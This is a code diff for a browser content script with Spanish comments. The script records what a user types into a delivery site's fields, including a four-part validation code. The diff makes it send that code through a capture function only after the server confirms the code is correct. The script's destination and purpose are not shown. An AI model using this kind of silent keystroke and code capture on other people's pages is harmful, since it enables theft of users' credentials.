@@ -3,7 +3,11 @@ const CONTENT_STATE_KEY = '__shalomRecordarContentState__';
 const DOC_INPUT_ID = 'inputnombre';
 const OS_INPUT_ID = 'inputnroguia';
 const CLAVE_FIELDS = ['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'];
-const CLAVE_MODAL_ID = 'modalValidarCodigo';
+// Senal de que la clave fue CORRECTA: el servidor inyecta el formulario de
+// entrega (action="entrega/ajax") solo cuando el codigo validado es valido. El
+// cierre del modal de validacion no sirve: tambien ocurre al cancelar o fallar.
+const ENTREGA_FORM_ID = 'frmEntrega';
+const ENTREGA_ACTION_HINT = 'entrega/ajax';
 const DEDUPE_WINDOW_MS = 1500;
 const OS_DEBOUNCE_MS = 650;
 
@@ -177,25 +181,51 @@ function getClaveCompleteValue() {
     return CLAVE_FIELDS.map((fieldId) => buffer[fieldId] || '').join('');
 }
 
-function ensureClaveModalObserver() {
+function isElementVisible(target) {
+    for (let node = target; node; node = node.parentElement) {
+        if (node.hidden || (node.getAttribute && node.getAttribute('aria-hidden') === 'true')) return false;
+        const style = String((node.getAttribute && node.getAttribute('style')) || '').replace(/\s+/g, '').toLowerCase();
+        if (style.includes('display:none') || style.includes('visibility:hidden')) return false;
+    }
+    return true;
+}
+
+function isEntregaForm(form) {
+    if (!form) return false;
+    const action = String((form.getAttribute && form.getAttribute('action')) || '');
+    // El id basta; la action se comprueba como respaldo cuando esta disponible.
+    return action === '' || action.includes(ENTREGA_ACTION_HINT);
+}
+
+/**
+ * Captura la clave cuando aparece el formulario de entrega.
+ *
+ * Es la senal fiable de que el codigo fue correcto: el servidor solo inyecta
+ * ese formulario tras validar. El buffer conserva lo ultimo tecleado, de modo
+ * que si hubo intentos fallidos previos, se envia el intento acertado.
+ *
+ * Se marca `entregaConfirmed` para no reenviar mientras el formulario sigue en
+ * pantalla, y se reinicia cuando desaparece, para que la siguiente entrega
+ * pueda dispararse de nuevo.
+ */
+function checkEntregaConfirmation() {
     const state = getContentState();
-    if (state.claveModalObserverAttached || typeof MutationObserver === 'undefined') return;
+    const form = document.getElementById(ENTREGA_FORM_ID);
+    const present = Boolean(form) && isEntregaForm(form) && isElementVisible(form);
 
-    const modal = document.getElementById(CLAVE_MODAL_ID);
-    if (!modal) return;
+    if (!present) {
+        state.entregaConfirmed = false;
+        return;
+    }
 
-    state.claveModalObserverAttached = true;
-    const modalObserver = new MutationObserver(() => {
-        const style = modal.getAttribute('style') || '';
-        if (style.includes('display: none')) {
-            const value = getClaveCompleteValue();
-            if (!value) return;
-            sendCapture('Clave', value, CLAVE_MODAL_ID, Date.now());
-            state.claveBuffer = {};
-        }
-    });
-    modalObserver.observe(modal, { attributes: true, attributeFilter: ['style'] });
-    state.claveModalObserver = modalObserver;
+    if (state.entregaConfirmed) return;
+    state.entregaConfirmed = true;
+
+    const value = getClaveCompleteValue();
+    if (!value) return;
+
+    sendCapture('Clave', value, ENTREGA_FORM_ID, Date.now());
+    state.claveBuffer = {};
 }
 
 function handleCapture(event) {
@@ -247,12 +277,12 @@ function ensureMutationObserver() {
     state.captureObserverAttached = true;
     const observer = new MutationObserver(() => {
         ensureDocumentListener();
-        ensureClaveModalObserver();
+        checkEntregaConfirmation();
     });
 
     observer.observe(root, { childList: true, subtree: true });
     state.captureObserver = observer;
-    ensureClaveModalObserver();
+    checkEntregaConfirmation();
 }
 
 ensureDocumentListener();
